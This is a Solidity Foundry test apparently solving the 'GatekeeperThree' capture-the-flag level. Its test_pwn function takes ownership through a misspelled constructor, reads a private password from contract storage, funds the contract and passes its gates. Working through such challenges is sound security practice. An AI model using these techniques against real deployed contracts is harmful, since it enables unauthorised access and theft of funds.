// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {SimpleTrick, GatekeeperThree} from "../src/L29/GatekeeperThree.sol";

contract TestEvil_29 is Test {
    GatekeeperThree t;

    function setUp() public {
        t = GatekeeperThree(
            payable(0x2E2ee25fE88f4dFF3C2531cCB1B8d937CA78Cd6D)
        );
        console2.log(address(this));
    }

    function test_pwn() external {
        t.entrant();
        t.construct0r();
        t.createTrick();
        address a = address(t.trick());
        uint256 b = uint256(bytes32(vm.load(a, bytes32(uint256(2)))));
        // on sepolia there were some issues could put above code to contructor
        // and the code below as seperate function with param with timestamp for getAllowance
        t.getAllowance(b);
        address(t).call{value: 0.002 ether}("");
        t.enter();
        t.entrant();
    }

    // receive() external payable {
    //     revert();
    // }
}
